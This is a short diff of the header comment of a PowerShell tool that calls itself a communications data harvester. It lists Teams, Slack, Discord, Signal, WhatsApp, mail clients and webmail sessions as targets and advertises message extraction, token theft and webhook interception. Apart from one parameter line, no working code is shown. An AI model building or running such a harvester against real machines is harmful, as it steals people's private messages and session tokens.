@@ -1,24 +1,11 @@
-<#
-============================================================================
-  FLLC — COMMUNICATIONS DATA HARVESTER v1.777
-  ═════════════════════════════════════════════
-  
-  Extracts messaging data, tokens, session info from:
-    ■ Microsoft Teams (desktop + new Teams)
-    ■ Slack Desktop
-    ■ Discord Desktop
-    ■ Telegram Desktop
-    ■ Signal Desktop
-    ■ WhatsApp Desktop
-    ■ Zoom
-    ■ Skype
-    ■ Element / Matrix
-    ■ Thunderbird / Outlook profiles
-    ■ Browser-based webmail sessions (Gmail, Outlook.com, Yahoo)
-  
-  FLLC 2026 | Authorized penetration testing only.
-============================================================================
-#>
+﻿<# ═══════════════════════════════════════════════════════════════════════
+   FLLC | FU PERSON | COMMS HARVESTER v2.0
+   ╔══════════════════════════════════════════════════════════════════╗
+   ║  Teams/Slack/Discord/Signal Data Extraction                      ║
+   ║  Message history | File attachments | Token theft                ║
+   ║  Webhook interception | Channel enumeration                      ║
+   ╚══════════════════════════════════════════════════════════════════╝
+═══════════════════════════════════════════════════════════════════════ #>
 
 param(
     [string]$OutputDir = "$PSScriptRoot\..\..\collected\comms",
